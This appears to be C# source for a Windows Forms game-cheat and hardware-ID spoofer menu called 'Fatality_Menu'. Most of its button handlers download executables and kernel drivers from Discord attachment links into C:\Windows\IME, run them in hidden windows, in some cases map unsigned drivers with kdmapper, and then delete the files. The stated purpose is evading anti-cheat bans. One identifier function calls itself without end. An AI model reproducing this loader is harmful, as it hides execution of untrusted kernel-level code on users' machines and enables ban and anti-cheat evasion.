using System;
using System.Drawing;
using theme_for_jack;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Net;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Management;
using System.Collections.Generic;
using System.Security.Principal;
using System.Net.NetworkInformation;

namespace Fatality_Menu
{
    public partial class Menu : Form
    {
        public Menu()
        {
            InitializeComponent();
        }
        private bool mouseDown;
        private Point lastLocation;
        public Boolean isFlash;
        const String WIN_10_PATH = @"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001";
        string backupHWID = "";
        private void Picturebox1_Paint(object sender, PaintEventArgs e)
        {
            using (Brush rainbow_brush2 = Rainbow.RainbowBrush2(
            new Point(0, 0),
            new Point(Main.ClientSize.Width, Main.ClientSize.Height)))
            {
                e.Graphics.FillRectangle(rainbow_brush2, Main.ClientRectangle);
            }
        }
        private void Menu_Load(object sender, EventArgs e)
        {
            ID();


        }
        private void T_MouseDown(object sender, MouseEventArgs e)
        {
            mouseDown = true;
            lastLocation = e.Location;
        }

        private void T_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseDown)
            {
                this.Location = new Point(
                    (this.Location.X - lastLocation.X) + e.X, (this.Location.Y - lastLocation.Y) + e.Y);

                this.Update();
            }
        }
        private void ID()
        {
            string ID = "i6 j7 l9 k9 s7";
            label27.Text = ID;
            label28.Text = ID;
            label29.Text = ID;
        }

        private void T_MouseUp(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }

        private void label20_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = RTab;
        }

        private void label19_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = VTab;
        }

        private void label18_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = MTab;
        }

        private void label17_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = ITab;
        }

        private void label16_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = LTab;
        }

        private void label1_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = LTab;
        }

        private void label2_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = ITab;
        }

        private void label3_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = MTab;
        }

        private void label4_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = VTab;
        }

        private void label5_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = RTab;
        }

        private void label6_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = LTab;
        }

        private void label7_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = ITab;
        }

        private void label8_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = MTab;
        }

        private void label9_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = VTab;
        }

        private void label10_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = RTab;
        }

        private void label11_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = LTab;
        }

        private void label12_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = ITab;
        }

        private void label13_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = MTab;
        }

        private void label14_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = VTab;
        }

        private void label15_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = RTab;
        }

        private void RageTab_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = RTab;
        }

        private void VisualsTab_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = VTab;
        }

        private void MiscTab_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = MTab;
        }

        private void InventoryTab_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = ITab;
        }

        private void LegitTab_Click(object sender, EventArgs e)
        {
            Tabs.SelectedTab = LTab;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        private void RTab_Click(object sender, EventArgs e)
        {

        }

        private void customLabel5_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button11_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\hwid.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/689317039252177016/690283887104098304/hwid.exe", text);


            Process process = new Process();
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text);
            Thread.Sleep(1000);
            hwidgrab();





        }
        private void hwidgrab()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(WIN_10_PATH))
            {
                if (key != null)
                {
                    backupHWID = key.GetValue("HwProfileGuid").ToString();
                    label16.Text = backupHWID;
                }
                else
                {
                    throw new Exception();
                }
            }
        }

        private void header25_Load(object sender, EventArgs e)
        {

        }

        private void GetHWID_Click(object sender, EventArgs e)
        {

        }

        private void label16_Click_1(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void DiscordLoadPreset_Click(object sender, EventArgs e)
        {
            hwidgrab();
        }


        private void button13_Click(object sender, EventArgs e)
        {
            MessageBox.Show("This Cleaner Is Only For Fortnite Please Since We Disscontinued On Fn Please Dont run this");
            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\CCleaner.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/691781036501368954/692488126479728791/Cleaner.exe", text);


            Process process = new Process();
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text);
            Thread.Sleep(1000);
            label19.Text = "CLEANED Traces";
            label19.ForeColor = Color.Green;
        }


        private void button4_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\mapper.exe";
            string text2 = @"C:\Windows\IME\spoof.sys";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660983927883825163/spoofer.sys", text2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660984792061313024/mapper_3.exe", text);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = false;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text, text2);
            Thread.Sleep(1000);
            process.Close();
            File.Delete(text2);
            File.Delete(text);

            label21.Text = "0x999999999-> Spoofed";
            label21.ForeColor = Color.Green;

        }

        private string identifier(string wmiClass, string wmiProperty)
        //Return a hardware identifier
        {
            string modelNo = identifier("Win32_DiskDrive", "Model");
            string manufatureID = identifier("Win32_DiskDrive", "Manufacturer");
            string signature = identifier("Win32_DiskDrive", "Signature");
            string totalHeads = identifier("Win32_DiskDrive", "TotalHeads");
            string result = "";
            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
            System.Management.ManagementObjectCollection moc = mc.GetInstances();
            foreach (System.Management.ManagementObject mo in moc)
            {
                //Only get the first one
                if (result == "")
                {
                    try
                    {
                        result = mo[wmiProperty].ToString();
                        break;
                    }
                    catch
                    {
                    }
                }
                label19.Text = result;
            }
            
            return result;
        }
        private void test()
        {
            string modelNo = identifier("Win32_DiskDrive", "Model");
            string manufatureID = identifier("Win32_DiskDrive", "Manufacturer");
            string signature = identifier("Win32_DiskDrive", "Signature");
            string totalHeads = identifier("Win32_DiskDrive", "TotalHeads");
            MessageBox.Show("", modelNo);
        }

        private void label21_Click(object sender, EventArgs e)
        {

        }

        private void button12_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\checker.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/691052834220671037/692508650287267850/checker.exe", text);


            Process process = new Process();
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text);
            Thread.Sleep(1000);
        }

        private void label19_Click_1(object sender, EventArgs e)
        {

        }

        private void label17_Click_1(object sender, EventArgs e)
        {

        }

        private void label21_Click_1(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\mapper11.exe";
            string text2 = @"C:\Windows\IME\serial.sys";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/691052834220671037/692513464857657364/serial.sys", text2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/691052834220671037/692513497778487357/mapper.exe", text);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text, text2);
            Thread.Sleep(1000);
            process.Close();
            File.Delete(text2);
            File.Delete(text);

            label23.Text = "CapCom Driver Unloaded";
            label23.ForeColor = Color.Green;
        }

        private void textBox8_TextChanged(object sender, EventArgs e)
        {

        }

        private void label23_Click(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Restart Your PC After Using This Spoofer");
            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\UHWID.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/691052834220671037/692521636607426631/HWID_Spoofer.exe", text);


            Process process = new Process();
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text);
            Thread.Sleep(1000);

        }

        private void label25_Click(object sender, EventArgs e)
        {

        }

        private void textBox16_TextChanged(object sender, EventArgs e)
        {

        }

        private void button7_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\checker.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/691052834220671037/692536000420904990/MAC-Changer.exe", text);

            string ID = "randomInt";
            
            Process process = new Process();
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text);
            Thread.Sleep(1000);
            MessageBox.Show("Setting All MAC IDS", ID);
            label27.Text = ID;
            label28.Text = ID;
            label29.Text = ID;
        }

        private void label29_Click(object sender, EventArgs e)
        {

        }

        private void button6_Click(object sender, EventArgs e)
        {
            
            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\mapper111.exe";
            string text2 = @"C:\Windows\IME\seriall.sys";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/699747088808017922/699747872375177276/pysry.sys", text2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/699747088808017922/699747871536316556/kdmapper.exe", text);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text, text2);
            Thread.Sleep(1000);
            process.Close();
            File.Delete(text2);
            File.Delete(text);

            label23.Text = "Intel Driver Loaded";
            label23.ForeColor = Color.Green;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\mappser111.exe";
            string text2 = @"C:\Windows\IME\serdsiall.sys";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/699747088808017922/703114884950523914/serial.sys", text2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/699747088808017922/699747871536316556/kdmapper.exe", text);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = false;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text, text2);
            Thread.Sleep(1000);
            process.Close();
            File.Delete(text2);
            File.Delete(text);

            label23.Text = "AMD Driver Loaded";
            label23.ForeColor = Color.Green;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Coming Soon! Please Wait Till A Client Update");
        }

        private void label26_Click(object sender, EventArgs e)
        {

        }

        private void label27_Click(object sender, EventArgs e)
        {

        }

        private void label28_Click(object sender, EventArgs e)
        {

        }
    }
}

